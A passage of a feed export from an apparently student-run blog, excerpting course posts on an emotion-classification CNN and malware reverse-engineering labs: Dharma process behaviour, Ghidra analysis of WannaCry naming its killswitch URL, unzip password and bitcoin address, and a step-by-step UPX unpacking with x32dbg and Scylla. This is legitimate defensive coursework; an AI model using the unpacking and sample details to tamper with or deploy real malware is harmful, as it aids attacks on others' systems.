 &lt;th style="text-align: center">WD_HR&lt;/th>
 &lt;th style="text-align: center">WIND_DIREC&lt;/th>
 &lt;th style="text-align: center">WIND_SPEED&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td style="text-align: center">r&lt;/td>
 &lt;td style="text-align: center">-0.176147465&lt;/td>
 &lt;td style="text-align: center">0.659147668&lt;/td>
 &lt;td style="text-align: center">0.227219147&lt;/td>
 &lt;td style="text-align: center">0.554273687&lt;/td>
 &lt;td style="text-align: center">0.51365014&lt;/td>
 &lt;td style="text-align: left">0.233923944&lt;/td>
 &lt;td style="text-align: left">0.818868214&lt;/td>
 &lt;td style="text-align: center">-0.102047405&lt;/td>
 &lt;td style="text-align: center">-0.060801221&lt;/td>
 &lt;td style="text-align: center">-0.081576429&lt;/td>
 &lt;td style="text-align: center">0.361333416&lt;/td>
 &lt;td style="text-align: center">0.171932397&lt;/td>
 &lt;td style="text-align: center">0.137658351&lt;/td>
 &lt;td style="text-align: center">-0.10119696&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;/li>
&lt;/ul></description></item><item><title>NTU Machine Learning Homework 2</title><link>https://bernie6401.github.io/docs/security/course/ntu-ml/ntu-machine-learning-homework-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-ml/ntu-machine-learning-homework-2/</guid><description>&lt;h1 id="ntu-machine-learning-homework-2">
 NTU Machine Learning Homework 2
 &lt;a class="anchor" href="#ntu-machine-learning-homework-2">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntu_ml-machine-learning">
 tags: &lt;code>NTU_ML&lt;/code> &lt;code>Machine Learning&lt;/code>
 &lt;a class="anchor" href="#tags-ntu_ml-machine-learning">#&lt;/a>
&lt;/h6>
&lt;p>:::spoiler Click to open TOC
[TOC]
:::&lt;/p>
&lt;h2 id="objective">
 Objective
 &lt;a class="anchor" href="#objective">#&lt;/a>
&lt;/h2>
&lt;p>We&amp;rsquo;d like to classify human-being emotion by using CNN model that self-construct or others ready-made such as ResNet or VGG model.&lt;/p>
&lt;h2 id="data">
 Data
 &lt;a class="anchor" href="#data">#&lt;/a>
&lt;/h2>
&lt;p>We used emotional dataset from &lt;a href="https://www.kaggle.com/datasets/msambare/fer2013?datasetId=786787&amp;amp;sortBy=dateRun&amp;amp;tab=profile">FER2013&lt;/a> that were preprocessed by lecture TA.&lt;/p>
&lt;h2 id="models">
 Models
 &lt;a class="anchor" href="#models">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>Originial&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>self&lt;span style="color:#f92672">.&lt;/span>conv_0 &lt;span style="color:#f92672">=&lt;/span> nn&lt;span style="color:#f92672">.&lt;/span>Sequential(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> nn&lt;span style="color:#f92672">.&lt;/span>Conv2d(&lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">64&lt;/span>, kernel_size&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>, padding&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> nn&lt;span style="color:#f92672">.&lt;/span>BatchNorm2d(&lt;span style="color:#ae81ff">64&lt;/span>, eps&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1e-05&lt;/span>, affine&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">True&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> nn&lt;span style="color:#f92672">.&lt;/span>LeakyReLU(negative_slope&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0.05&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> nn&lt;span style="color:#f92672">.&lt;/span>MaxPool2d((&lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>)),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>I&amp;rsquo;ve used 3-level model for training but not have good result&lt;/p></description></item><item><title>NTU Malware Reverse Final Project Notes</title><link>https://bernie6401.github.io/docs/security/course/ntu-mr/ntu-malware-reverse-final-project-notes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-mr/ntu-malware-reverse-final-project-notes/</guid><description>&lt;h1 id="ntu-malware-reverse-final-project-notes">
 NTU Malware Reverse Final Project Notes
 &lt;a class="anchor" href="#ntu-malware-reverse-final-project-notes">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntu_mr-malware-reverse-engineering-and-analysis">
 tags: &lt;code>NTU_MR&lt;/code> &lt;code>Malware Reverse Engineering and Analysis&lt;/code>
 &lt;a class="anchor" href="#tags-ntu_mr-malware-reverse-engineering-and-analysis">#&lt;/a>
&lt;/h6>
&lt;h2 id="deep-learning-at-the-shallow-end-malware-classification-for-non-domain-experts">
 Deep learning at the shallow end Malware classification for non-domain experts
 &lt;a class="anchor" href="#deep-learning-at-the-shallow-end-malware-classification-for-non-domain-experts">#&lt;/a>
&lt;/h2>
&lt;h3 id="how-to-reproduce">
 How to reproduce?
 &lt;a class="anchor" href="#how-to-reproduce">#&lt;/a>
&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>Construct Environment
The whole construction step can see &lt;a href="https://hackmd.io/@cwl0429/install_tf_guide">安裝 tensorflow 及 cuda cudnn 心得&lt;/a>.
Refer to &lt;a href="https://www.tensorflow.org/install/source_windows#gpu">documentation for tensorflow&lt;/a>, I choose the library shown as below&amp;hellip;&lt;/p>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th style="text-align: center">Object&lt;/th>
 &lt;th style="text-align: center">CUDA&lt;/th>
 &lt;th style="text-align: center">cuDNN&lt;/th>
 &lt;th style="text-align: center">Python&lt;/th>
 &lt;th style="text-align: center">GPU Driver Version&lt;/th>
 &lt;th style="text-align: center">tensorflow&lt;/th>
 &lt;th style="text-align: center">tensorflow-gpu&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td style="text-align: center">Version&lt;/td>
 &lt;td style="text-align: center">11.2&lt;/td>
 &lt;td style="text-align: center">8.1&lt;/td>
 &lt;td style="text-align: center">3.6.13&lt;/td>
 &lt;td style="text-align: center">526.98&lt;/td>
 &lt;td style="text-align: center">2.6.2&lt;/td>
 &lt;td style="text-align: center">2.6.0&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;p>Then refer to &lt;a href="https://docs.nvidia.com/deeplearning/cudnn/install-guide/index.html#install-windows">NVIDIA CUDNN DOCUMENTATION&lt;/a>, just use &lt;code>zlibwapi.dll&lt;/code> provided by this page directly. This compressed folder is for &lt;code>x64&lt;/code> processor.
Notice that, &lt;strong>&lt;font color=#FF0000>DO NOT USE &lt;a href="http://www.winimage.com/zLibDll/">this page&lt;/a> and &lt;a href="https://www.dll-files.com/zlibwapi.dll.html">this page&lt;/a>&lt;/font>&lt;/strong>. These are for &lt;code>x86&lt;/code> processor.&lt;/p></description></item><item><title>NTU Malware Reverse HW 1 write up</title><link>https://bernie6401.github.io/docs/security/course/ntu-mr/ntu-malware-reverse-hw-1-write-up/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-mr/ntu-malware-reverse-hw-1-write-up/</guid><description>&lt;h1 id="ntu-malware-reverse-hw-1-write-up">
 NTU Malware Reverse HW 1 write up
 &lt;a class="anchor" href="#ntu-malware-reverse-hw-1-write-up">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntu_mr-malware-reverse-engineering-and-analysis-ntu">
 tags: &lt;code>NTU_MR&lt;/code> &lt;code>Malware Reverse Engineering and Analysis&lt;/code> &lt;code>NTU&lt;/code>
 &lt;a class="anchor" href="#tags-ntu_mr-malware-reverse-engineering-and-analysis-ntu">#&lt;/a>
&lt;/h6>
&lt;p>[TOC]&lt;/p>
&lt;h2 id="task-1">
 Task 1
 &lt;a class="anchor" href="#task-1">#&lt;/a>
&lt;/h2>
&lt;h3 id="analyze-the-lab06-01exe">
 Analyze the &lt;code>Lab06-01.exe&lt;/code>
 &lt;a class="anchor" href="#analyze-the-lab06-01exe">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>What is the major code construct found in the only subroutine called by main?
Ans: It has only an if statement in the main function.
&lt;img src="https://imgur.com/JZiz0BC.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>What is the subroutine located at 0x40105F?
Ans: It’s just a &lt;code>printf&lt;/code> function. At the beginning, I can not recognize this code block do exactly until I analyze the program behavior by using string side bar to search the specific string in the code.&lt;/p></description></item><item><title>NTU Malware Reverse HW 2 write up</title><link>https://bernie6401.github.io/docs/security/course/ntu-mr/ntu-malware-reverse-hw-2-write-up/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-mr/ntu-malware-reverse-hw-2-write-up/</guid><description>&lt;h1 id="ntu-malware-reverse-hw-2-write-up">
 NTU Malware Reverse HW 2 write up
 &lt;a class="anchor" href="#ntu-malware-reverse-hw-2-write-up">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntu_mr-malware-reverse-engineering-and-analysis-ntu">
 tags: &lt;code>NTU_MR&lt;/code> &lt;code>Malware Reverse Engineering and Analysis&lt;/code> &lt;code>NTU&lt;/code>
 &lt;a class="anchor" href="#tags-ntu_mr-malware-reverse-engineering-and-analysis-ntu">#&lt;/a>
&lt;/h6>
&lt;p>[TOC]&lt;/p>
&lt;h2 id="task-1">
 Task 1
 &lt;a class="anchor" href="#task-1">#&lt;/a>
&lt;/h2>
&lt;p>執行勒索病毒&lt;code>Dharma&lt;/code>與Process monitor並截圖&lt;code>Dharma&lt;/code>的Process Tree，並分析說明每個Process行為
&lt;img src="https://imgur.com/vzb9g9O.png" alt="" />
Ans:&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;code>Conhost.exe&lt;/code>: It’s defined by Microsoft and is normally legal and safe. Working on &lt;code>Win7&lt;/code>, &lt;code>Win8&lt;/code>, and &lt;code>Win10&lt;/code>. The main function of this PE file is to let Command Prompt and Windows File Explorer can interact. The other function is to support users who can drag the file or folder to the command prompt directly. Most of the time, it’s a safe file that even repeats execution many times. However, in some circumstances, the viruses will pretend a &lt;code>conhost.exe&lt;/code> file to use massive memory or store it in the wrong folder.[1]
&lt;img src="https://imgur.com/xQayXgX.png" alt="" />&lt;/p></description></item><item><title>NTU Malware Reverse HW 3 write up</title><link>https://bernie6401.github.io/docs/security/course/ntu-mr/ntu-malware-reverse-hw-3-write-up/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-mr/ntu-malware-reverse-hw-3-write-up/</guid><description>&lt;h1 id="ntu-malware-reverse-hw-3-write-up">
 NTU Malware Reverse HW 3 write up
 &lt;a class="anchor" href="#ntu-malware-reverse-hw-3-write-up">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntu_mr-malware-reverse-engineering-and-analysis">
 tags: &lt;code>NTU_MR&lt;/code> &lt;code>Malware Reverse Engineering and Analysis&lt;/code>
 &lt;a class="anchor" href="#tags-ntu_mr-malware-reverse-engineering-and-analysis">#&lt;/a>
&lt;/h6>
&lt;p>[TOC]&lt;/p>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Name&lt;/th>
 &lt;th>何秉學&lt;/th>
 &lt;th>StuID&lt;/th>
 &lt;th>R11921A16&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="task-1-lab-15-01exe">
 Task 1: &lt;code>Lab 15-01.exe&lt;/code>
 &lt;a class="anchor" href="#task-1-lab-15-01exe">#&lt;/a>
&lt;/h2>
&lt;h3 id="observation">
 Observation
 &lt;a class="anchor" href="#observation">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>When I execute the file, it print out a message: &lt;code>Son, I am disappoint.&lt;/code> Refer to the description below, I must enter some parameter that match the secret code.&lt;/p>
&lt;blockquote>
&lt;p>Analyze the sample found in the file &lt;code>Lab15-01.exe&lt;/code>. This is a command-line program that takes an argument and prints &lt;code>Good Job!&lt;/code> if the argument matches a secret code.&lt;/p></description></item><item><title>NTU Malware Reverse Lab 1 write up</title><link>https://bernie6401.github.io/docs/security/course/ntu-mr/ntu-malware-reverse-lab-1-write-up/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-mr/ntu-malware-reverse-lab-1-write-up/</guid><description>&lt;h1 id="ntu-malware-reverse-lab-1-write-up">
 NTU Malware Reverse Lab 1 write up
 &lt;a class="anchor" href="#ntu-malware-reverse-lab-1-write-up">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntu_mr-malware-reverse-engineering-and-analysis-ntu">
 tags: &lt;code>NTU_MR&lt;/code> &lt;code>Malware Reverse Engineering and Analysis&lt;/code> &lt;code>NTU&lt;/code>
 &lt;a class="anchor" href="#tags-ntu_mr-malware-reverse-engineering-and-analysis-ntu">#&lt;/a>
&lt;/h6>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Name&lt;/th>
 &lt;th>何秉學&lt;/th>
 &lt;th>StuID&lt;/th>
 &lt;th>R11921A16&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="wannacry">
 WannaCry
 &lt;a class="anchor" href="#wannacry">#&lt;/a>
&lt;/h2>
&lt;h3 id="change-variable-and-data-type">
 Change variable and data type
 &lt;a class="anchor" href="#change-variable-and-data-type">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>Follow the video and replace most of the variable that ghidra did not recognize and retype them also.&lt;/li>
&lt;li>According to the video, you must search the entry point function(local_6c = FUN_00408140();) first and replace the signature by &lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/learnwin32/winmain--the-application-entry-point">here&lt;/a>&lt;/li>
&lt;li>Then click into WinMain function and you&amp;rsquo;ll see a strange url at the beginning of the top. Try to rename and retype it as char*.&lt;/li>
&lt;li>Ghidra can not recognize &lt;a href="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopena">InternetOpenA&lt;/a>, and &lt;a href="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenurla">InternetOpenUrlA&lt;/a>. But you can found that ghidra cannot recognize hinternet datatype as well. So, we must create new datatype in Datt Type Manager.&lt;/li>
&lt;li>And in write_1831_to_tasksche.exe function, the first if-statement has 4 variable that ghidra can&amp;rsquo;t recognize, including createProcessA, _createFileA, _writeFile, _closeHandle. So, you&amp;rsquo;re not only rename them but retype them for the following statement for each of them.(Ghidra has all type of them but it just can not recognize.)&lt;/li>
&lt;li>When you have 1831.bin file(you can follow Analyze part at 5-th and 6-th section), useing &lt;strong>Defined String&lt;/strong> window to check out some function including unzip_something function.&lt;/li>
&lt;li>Scroll down the &lt;strong>Defined String&lt;/strong>, you&amp;rsquo;ll see string &lt;strong>13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94&lt;/strong> at 0x0040f488. Then in assembly code, there&amp;rsquo;re 3 similar function be called at the sametime. We called it bitcoin_something function.&lt;/li>
&lt;/ul>
&lt;h3 id="analyze">
 Analyze
 &lt;a class="anchor" href="#analyze">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>For the first part to analyze, you can check out for loop after strange_url variable. It does this loop for 14 times and copy strange_url to strange_url_copy by andding 4.&lt;/li>
&lt;li>Next, you can find an if statement at the below. Check this out carefully, it the internet request failed, it&amp;rsquo;ll access wannacry_real_entry() function.&lt;/li>
&lt;li>Enter to wannacry_real_entry function, you&amp;rsquo;ll see another if statement to examine your argument input. If you keyin less than 1 argument, it&amp;rsquo;ll execute no_argument_handler function and start create_wannacry_service function.&lt;/li>
&lt;li>Checking wannacry program in second function of no_argument_handler function by assembly language, you&amp;rsquo;ll find there&amp;rsquo;re two sprintf structure are not correct in the middle paragraph. Because, there&amp;rsquo;re two more argument should be pushed in stack but not be recognized by ghidra, including s_tasksche.exe_0043136c and 0x00407dea and s_WINDOWS_00431367 at 0x00407df2. So, we have to override this line signature and add the remaining argument back to sprinf.
&lt;img src="https://imgur.com/HE2vWWo.png" alt="2 arguments did not be recognized" />&lt;/li>
&lt;li>So, let&amp;rsquo;s take a look at this flow chart of what happened so far &lt;img src="https://imgur.com/JtLrxwf.png" alt="flow chart of first stage" />&lt;/li>
&lt;li>Then I used another VM(Ubuntu) to command wrestool to analyze wannacry file and output another file named 1831.bin. Using ghidra to analyze this file. Then do the same thing as above that what we do to analyze wannacry file such as change WinMain signature or renamee variable or retype variable, etc.&lt;/li>
&lt;li>While you&amp;rsquo;re analyzing in WinMain function, you&amp;rsquo;ll see a strange variable &amp;amp;_Str2_0040f538 which store &amp;lsquo;/i&amp;rsquo; characters. You can just press &amp;lsquo;c&amp;rsquo; in assembly code to show &amp;lsquo;\i&amp;rsquo;.&lt;/li>
&lt;li>Next, scroll down this file, you&amp;rsquo;ll see a strange swprintf parameter called _Count_0040f40c. Then select all addr type data and right click mouse and select &lt;strong>clear with option&lt;/strong>. You&amp;rsquo;ll see many unicode strings. Finally, right click DAT_0040f40c and choose Data/TerminatedUnicode.&lt;/li>
&lt;li>Finally, you can check this figure to know the whole operation flow &lt;img src="https://imgur.com/P00ObJZ.png" alt="whole flow chart of wannacry" />&lt;/li>
&lt;/ul>
&lt;p>1.1 What is the &amp;lsquo;killswitch&amp;rsquo; string?
Ans: &lt;a href="http://www.iuqerfsodp">http://www.iuqerfsodp&lt;/a>9ifjaposdfj
1.2 What is the unzip password? (as show in below)
Ans: WNcry@2o17&lt;/p></description></item><item><title>NTU Malware Reverse Lab 2 write up</title><link>https://bernie6401.github.io/docs/security/course/ntu-mr/ntu-malware-reverse-lab-2-write-up/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-mr/ntu-malware-reverse-lab-2-write-up/</guid><description>&lt;h1 id="ntu-malware-reverse-lab-2-write-up">
 NTU Malware Reverse Lab 2 write up
 &lt;a class="anchor" href="#ntu-malware-reverse-lab-2-write-up">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntu_mr-malware-reverse-engineering-and-analysis-ntu">
 tags: &lt;code>NTU_MR&lt;/code> &lt;code>Malware Reverse Engineering and Analysis&lt;/code> &lt;code>NTU&lt;/code>
 &lt;a class="anchor" href="#tags-ntu_mr-malware-reverse-engineering-and-analysis-ntu">#&lt;/a>
&lt;/h6>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Name&lt;/th>
 &lt;th>何秉學&lt;/th>
 &lt;th>StuID&lt;/th>
 &lt;th>R11921A16&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="analyze-the-malware-1-found-in-the-file-lab13-02zip---lab13-02exe-generate-yourself-write-ups-with-screenshots-and-answer-the-follow-questions-">
 Analyze the malware 1 found in the file Lab13-02.zip -&amp;gt; Lab13-02.exe, generate &amp;lsquo;yourself&amp;rsquo; write ups (with screenshots) and answer the follow questions :
 &lt;a class="anchor" href="#analyze-the-malware-1-found-in-the-file-lab13-02zip---lab13-02exe-generate-yourself-write-ups-with-screenshots-and-answer-the-follow-questions-">#&lt;/a>
&lt;/h2>
&lt;p>1.1 Using dynamic analysis, determine what this malware creates.
Ans:&lt;/p>
&lt;ul>
&lt;li>According to &lt;a href="https://blog.csdn.net/m1287578441/article/details/125185048">reference&lt;/a>, you can also use procmon(Process Monitor) to monitor the whole progress after executing this file. The progress of first iteration is shown as below
&lt;img src="https://imgur.com/tCr29ps.png" alt="result from process monitor" />
Then use PEiD to check if the file has shell or not. And refer to the result as below, it seems has not shell, so that we can use IDA directly.
&lt;img src="https://imgur.com/Bpcnm1c.png" alt="result from PEiD" />&lt;/li>
&lt;li>I used IDA to analyze this executable file and observe that it&amp;rsquo;ll execute sub_401851 function every 10 seconds. And when I execute it in VM, it&amp;rsquo;ll create a temp file name temp00XXXXXX.
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">int __cdecl main(int argc, const char **argv, const char **envp)
{
 while ( 1 )
 {
 Sleep(5000u);
 sub_401851();
 Sleep(5000u);
 }
}
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;p>1.2 Use static techniques such as an xor search, FindCrypt2, KANAL, and the IDA Entropy Plugin to look for potential encoding. What do you find?&lt;strong>(Install findcrypt and IDA Entropy plugin can refer to Appendix 1, 2)&lt;/strong>
Ans:&lt;/p></description></item><item><title>NTU Malware Reverse Lab 3 write up</title><link>https://bernie6401.github.io/docs/security/course/ntu-mr/ntu-malware-reverse-lab-3-write-up/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-mr/ntu-malware-reverse-lab-3-write-up/</guid><description>&lt;h1 id="ntu-malware-reverse-lab-3-write-up">
 NTU Malware Reverse Lab 3 write up
 &lt;a class="anchor" href="#ntu-malware-reverse-lab-3-write-up">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntu_mr-malware-reverse-engineering-and-analysis-ntu">
 tags: &lt;code>NTU_MR&lt;/code> &lt;code>Malware Reverse Engineering and Analysis&lt;/code> &lt;code>NTU&lt;/code>
 &lt;a class="anchor" href="#tags-ntu_mr-malware-reverse-engineering-and-analysis-ntu">#&lt;/a>
&lt;/h6>
&lt;p>[TOC]&lt;/p>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Name&lt;/th>
 &lt;th>何秉學&lt;/th>
 &lt;th>StuID&lt;/th>
 &lt;th>R11921A16&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="review-packing-and-unpacking">
 Review Packing and Unpacking
 &lt;a class="anchor" href="#review-packing-and-unpacking">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>How does packing and unpacking work?
作者會把原本的code section和data section，放在UPX1，並且用unpacking stub(裡面存放解殼的程式)，把UPX1的內容一點一點的還原回UPX0(也就是空區段)，並跳回正常程式的執行進入點(original entry point, &lt;code>OEP&lt;/code>)，最後跳回去的動作叫做&lt;code>Tail Jump&lt;/code>或&lt;code>Long Jump&lt;/code>，另外，多長的jump才是長，可能要依照經驗值判斷，或是直接跳過去後分析程式在幹嘛
&lt;img src="https://imgur.com/TdhA1Tz.png" alt="" />&lt;/li>
&lt;li>實際上執行脫殼的時候，除了&lt;code>OEP&lt;/code>的重建外，還需要重建&lt;code>Imports&lt;/code>，這兩者都處理好後才算是脫殼完成&lt;/li>
&lt;li>當分析脫殼執行到如下圖這樣的情況時，就離終點不遠了，也就是&lt;code>jmp&lt;/code>的地址離目前的程式很遠，且之後的程式有很多空指令或垃圾&lt;code>byte&lt;/code>，&lt;font color="FF0000">&lt;strong>此為&lt;code>UXP&lt;/code>殼的特徵&lt;/strong>&lt;/font>
&lt;img src="https://imgur.com/KUbYRWa.png" alt="" />&lt;/li>
&lt;li>可以用&lt;code>PEiD&lt;/code>這個工具(或是用&lt;code>Entropy&lt;/code>之類的，但是不一定準確)判斷樣本有沒有加殼，或是加了甚麼殼，上圖是沒有加殼的一般程式，下圖是加了&lt;code>UPX&lt;/code>的加殼程式
&lt;img src="https://imgur.com/T0sFBc6.png" alt="" />
&lt;img src="https://imgur.com/9hDQtVr.png" alt="" />&lt;/li>
&lt;li>若是要處理&lt;code>Import Table Reconstruction&lt;/code>，可以用&lt;code>OllyDump&lt;/code>、&lt;code>ImpRec&lt;/code>或是&lt;code>Scylla&lt;/code>這些工具來進行，在&lt;code>Practice&lt;/code>中是用&lt;code>Scylla&lt;/code>演示(且可以搭配&lt;code>x32dbg&lt;/code>或&lt;code>x64dbg&lt;/code>進行)&lt;/li>
&lt;li>老師有說在&lt;code>Long Jump&lt;/code>之前會搭配&lt;code>pop&lt;/code> instruction，這可能可以當作解析&lt;code>OEP&lt;/code>的線索&lt;/li>
&lt;li>&lt;code>Tail Jump&lt;/code>，不一定是用&lt;code>jmp&lt;/code>，也可以是&lt;code>call&lt;/code> instruction；另外，跳轉的地址也不一定是一個明確的地址，也可能用暫存器存起來，這部分可以注意一下&lt;/li>
&lt;/ul>
&lt;h2 id="practice---upx_exerciseexe">
 Practice - &lt;code>upx_exercise.exe&lt;/code>
 &lt;a class="anchor" href="#practice---upx_exerciseexe">#&lt;/a>
&lt;/h2>
&lt;h3 id="observation">
 Observation
 &lt;a class="anchor" href="#observation">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>First things first, we can observe the file by executing it directly. Obviously, you should enter correct &lt;code>CTF&lt;/code> key by analyzing.
&lt;img src="https://imgur.com/RcXtqnV.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h3 id="unpacking">
 Unpacking
 &lt;a class="anchor" href="#unpacking">#&lt;/a>
&lt;/h3>
&lt;h4 id="static-analysis---ida-pro">
 Static analysis - &lt;code>IDA Pro&lt;/code>
 &lt;a class="anchor" href="#static-analysis---ida-pro">#&lt;/a>
&lt;/h4>
&lt;ul>
&lt;li>You are not allowed to disassembly by doing nothing, because it was packed by &lt;code>UPX&lt;/code>. Therefore, our objective is to unpack it and try to analyze it original code to get the &lt;code>CTF Flag&lt;/code>.
&lt;img src="https://imgur.com/CkqgK9U.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h4 id="dynamic-analysis---x32dbg">
 Dynamic analysis - &lt;code>x32dbg&lt;/code>
 &lt;a class="anchor" href="#dynamic-analysis---x32dbg">#&lt;/a>
&lt;/h4>
&lt;ul>
&lt;li>In &lt;code>UPX-based&lt;/code> packing, it has a feature that in order to not let the data be flushed during unpacking, it must store all data to the stack by using &lt;font color="FF0000">&lt;code>pushad&lt;/code>&lt;/font> instruction.
&lt;img src="https://imgur.com/lgZWxPL.png" alt="" />&lt;/li>
&lt;li>Then, you&amp;rsquo;ll see a lot of &lt;code>jmp&lt;/code> instruction to unpack the original code.
&lt;img src="https://imgur.com/W0Bj1dq.png" alt="" />&lt;/li>
&lt;li>Scrolling down the code, you&amp;rsquo;ll see a &lt;font color="FF0000">&lt;code>popad&lt;/code>&lt;/font> instruction at &lt;code>0x0134AEDE&lt;/code> , a &lt;font color="FF0000">&lt;code>jmp&lt;/code>&lt;/font> instruction at &lt;code>0x010EAEEC&lt;/code>, and a lots of &lt;code>null&lt;/code> instruction which all three are satisfied all features that &lt;code>UPX-based&lt;/code> packing method has.
It&amp;rsquo;ll restore all data that stored in stack and jump to &lt;code>upx_exercise.134244D&lt;/code>.
&lt;img src="https://imgur.com/vRJFQdU.png" alt="" />&lt;/li>
&lt;li>Set the break-point and press &lt;code>run&lt;/code> button in &lt;code>x32dbg&lt;/code>, then press &lt;code>step into&lt;/code> button to observe the code.&lt;/li>
&lt;li>Now, the code has already unpacked, then we can use &lt;font color="FF0000">&lt;strong>&lt;code>Scylla&lt;/code>&lt;/strong>&lt;/font> to do &lt;code>Import Reconstruction&lt;/code>.
&lt;img src="https://imgur.com/Tjn207G.png" alt="" />
&lt;img src="https://imgur.com/YBbISuc.png" alt="" />&lt;/li>
&lt;li>Press &lt;code>IAT Autosearch&lt;/code>(Import Address Table) button to search and then press &lt;code>Get Imports&lt;/code> button. Finally, you will get all imports that this file used, and &lt;code>Scylla&lt;/code> will help you to rebuild it.
&lt;img src="https://imgur.com/yUzV49b.png" alt="" />
Press &lt;code>Dump&lt;/code> button to get &lt;code>IAT&lt;/code> file.
&lt;img src="https://imgur.com/6RkqgO4.png" alt="" />&lt;/li>
&lt;li>Press &lt;code>Fix Dump&lt;/code> and choose the file what we dump to reconnect the &lt;code>IAT&lt;/code> and this file. You&amp;rsquo;ll see the log said &lt;code>Import Rebuild success&lt;/code> and you&amp;rsquo;ll get a new file named &lt;code>upx_exercise_dump_SCY.exe&lt;/code> that repaired by &lt;code>Scylla&lt;/code>.
&lt;img src="https://imgur.com/CIJEKcY.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h3 id="analyze">
 Analyze
 &lt;a class="anchor" href="#analyze">#&lt;/a>
&lt;/h3>
&lt;h4 id="re-static-analysis---ida-pro">
 Re-static analysis - &lt;code>IDA Pro&lt;/code>
 &lt;a class="anchor" href="#re-static-analysis---ida-pro">#&lt;/a>
&lt;/h4>
&lt;ul>
&lt;li>Used &lt;code>IDA&lt;/code> to reanalyze the unpacking file.&lt;/li>
&lt;li>Used string searching to find the string &lt;code>nope&lt;/code> that appear in your &lt;code>cmd&lt;/code>.
&lt;img src="https://imgur.com/OeInenc.png" alt="" />&lt;/li>
&lt;li>Used cross reference to find which part has used it.
&lt;img src="https://imgur.com/o7xwDFE.png" alt="" />
&lt;img src="https://imgur.com/zvQqq0u.png" alt="" />&lt;/li>
&lt;li>The main part is shown as below
